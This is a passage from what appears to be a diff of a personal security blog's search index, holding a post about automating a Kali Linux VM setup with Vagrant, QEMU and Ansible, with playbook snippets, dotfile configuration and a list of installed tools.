force: yes loop: - { src: \u0026#34;{{ user_home }}/.dotfiles/Zsh/.zshrc\u0026#34;, dest: \u0026#34;{{ user_home }}/.zshrc\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/config.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/config.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/init.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/init.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/packages.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/packages.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/README.org\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/README.org\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Starship/starship.toml\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/starship.toml\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Alacritty\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/Alacritty\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Tmux/.tmux.conf\u0026#34;, dest: \u0026#34;{{ user_home }}/.tmux.conf\u0026#34; } - name: Install Doom Emacs become_user: vagrant block: - name: Clone Doom Emacs git: repo: https://github.com/doomemacs/doomemacs dest: \u0026#34;{{ user_home }}/.config/emacs\u0026#34; depth: 1 - name: Install Doom Emacs # This is correct and the path is correct! shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom install --force\u0026#34; args: creates: \u0026#34;{{ user_home }}/.emacs.d/bin/doom\u0026#34; async: 900 poll: 15 - name: Update Doom recipe repositories shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom sync -u\u0026#34; async: 900 poll: 15 - name: Enable Docker service systemd: name: docker enabled: yes state: started - name: Add user to docker group user: name: vagrant groups: docker append: yes - name: Clean up apt: autoremove: yes clean: yes 3. Dotfiles and Tool Configuration The automation includes configuration for:\nAlacritty terminal emulator Tmux with custom keybindings Doom Emacs with security-focused packages Starship cross-shell prompt Zsh with Oh My Zsh Each tool has its own configuration module in the repository:\nAlacritty Configuration Tmux Configuration Doom Emacs Configuration Starship Configuration Zsh Configuration Included Tools \u0026amp; Features The automation sets up a comprehensive environment with:\nSecurity Tools SecLists (lots of lists) Kerbrute for Kerberos authentication testing Statistically Likely Usernames wordlist Common pentesting tools (I have my folders for linux \u0026amp; windows tools (I will make a repo for that soon)) Bloodhound for Active Directory analysis (dockerized) Development Environment Emacs 29.4 with native compilation Doom Emacs configuration This is my main editor and I use it for everything but if you prefer another editor you can change the Ansible playbook. Git version control Docker and Docker Compose Build tools and development libraries Modern Terminal Experience Alacritty terminal emulator Starship cross-shell prompt Tmuxinator for session management Command Line Improvements Eza (modern ls replacement) Bat (better cat) Ripgrep for searching fd-find for file discovery Enhanced Zsh configuration: zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete fast-syntax-highlighting Getting Started To use this automation:\nClone the repository:\ngit clone https://github.com/bloodstiller/kaliconfigs.git cd kaliconfigs Install prerequisites:\n# For Debian/Ubuntu sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients vagrant ansible # For Arch Linux sudo pacman -S qemu-full libvirt vagrant ansible Start the VM:\ncd Vagrant/QEMU vagrant up Development Workflow For efficient development and testing:\nRerun only Ansible playbooks:\nvagrant provision Run Ansible directly against the VM:\nvagrant ssh-config \u0026gt; vagrant-ssh-config ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory Ansible/configure-kali.yml Use snapshots for safe testing:\nvagrant snapshot save baseline vagrant snapshot restore baseline Customization Options The automation is highly customizable:\nVM Resources (Vagrantfile):\nconfig.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 end Package Selection (Ansible):\n​ - name: Install base packages apt: name: ​ - eza ​ - alacritty ​ - git # Add your packages here Shared Folders:\nconfig.vm.synced_folder \u0026#34;/path/to/host\u0026#34;, \u0026#34;/path/in/guest\u0026#34;, type: \u0026#34;virtiofs\u0026#34; Documentation \u0026amp; Resources For detailed setup and configuration instructions, refer to:\nMain Project Documentation - Overview and quick start guide Ansible Configuration Guide - Detailed playbook customization QEMU/KVM Setup Guide - QEMU-specific installation and configuration Alacritty Configuration - Terminal emulator setup Doom Emacs Configuration - Editor configuration Tmux Configuration - Terminal multiplexer setup Starship Configuration - Shell prompt customization Zsh Configuration - Shell configuration and plugins Conclusion Automating Kali VM setup with QEMU and Ansible has significantly improved my workflow. The combination of Vagrant for VM management, QEMU for virtualization, and Ansible for configuration provides a powerful and flexible automation stack.\nThe complete code is available in my kaliconfigs repository . Feel free to fork it and adapt it to your needs.\nHappy hacking!\n", 
         "url": "\/\/uildDrafts:1313\/tools\/automatingqemukalivmansible\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/automation\/": {
-        "title": "Automation",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/automation\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/dotfiles\/": {
-        "title": "Dotfiles",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/dotfiles\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/kali\/": {
-        "title": "Kali",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/kali\/"
-    },
-    
-    "\/\/uildDrafts:1313\/tags\/qemu\/": {
-        "title": "Qemu",
-        "tags": [],
-        "content": "", 
-        "url": "\/\/uildDrafts:1313\/tags\/qemu\/"
     },
     
     "\/\/uildDrafts:1313\/walkthroughs\/redpanda-box\/": {
